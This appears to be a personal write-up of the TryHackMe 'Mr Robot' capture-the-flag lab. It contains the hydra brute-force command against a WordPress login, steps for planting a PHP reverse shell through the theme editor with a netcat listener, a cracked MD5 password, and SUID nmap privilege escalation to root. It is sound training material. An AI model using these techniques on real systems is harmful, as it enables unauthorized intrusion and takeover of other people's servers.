# THM - Mr Robot CTF
**DATE: 4/5/26**
**Difficulty: Medium**
**OS: Linux**
**IP: 10.113.155.165**

## 1 - Enumeration
### nmap port scan
```
nmap -sV -sC --min-rate 5000 -p- 10.113.155.165
```
### Key Findings
- robots.txt exposed:
  - key-1-of-3.txt → flag 1
  - fsocity.dic → wordlist for brute force
- /wp-login → WordPress login page
- WordPress theme: Twenty Fifteen

## 2 - Exploitation
### WordPress Brute Force
- deduplicated wordlist: `sort -u fsocity.dic > fsocity_clean.dic`
- username: elliot
- tool: hydra
```
hydra -l elliot -P fsocity_clean.dic 10.113.155.165 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR"
```
- password found: ER28-0652

### Shell via Theme Editor
- Appearance → Editor → 404.php
- replaced with pentestmonkey php reverse shell
- edited $ip and $port
- started listener: nc -lvnp 4444
- triggered shell: http://10.113.155.165/wp-content/themes/twentyfifteen/404.php
- shell as www-data

### Key 2
- found /home/robot/password.raw-md5
- hash: c3fcd3d76192e4007dfb496cca67e13b
- cracked via crackstation.net → abcdefghijklmnopqrstuvwxyz
- ssh robot@10.113.155.165
- key 2 found in /home/robot/

## 3 - Privilege Escalation
### Enumeration
```
find / -perm -u=s -type f 2>/dev/null
```
- found /usr/local/bin/nmap with SUID bit — unusual, not a standard SUID binary

### Exploitation
- old nmap version has interactive mode
```
nmap --interactive
!sh
whoami → root
```

### Key 3
- found in /root/

## Flags
| Flag | Location |
|------|----------|
| Key 1 | /key-1-of-3.txt via robots.txt |
| Key 2 | /home/robot/key-2-of-3.txt |
| Key 3 | /root/key-3-of-3.txt |

## Lessons Learned
- always check robots.txt first
- fsocity.dic had duplicates — always deduplicate wordlists before brute forcing
- SUID nmap → nmap --interactive → !sh = root
- unusual SUID binaries = check GTFOBins immediately
- MD5 hashes → crackstation.net for quick lookup
- WordPress theme editor = easy shell if you have admin access

## Mistakes Made
- meterpreter session kept closing — php/reverse_php more stable for PHP shells
- HTTP 500 on 404.php — payload pasted uncleanly, use pentestmonkey shell instead
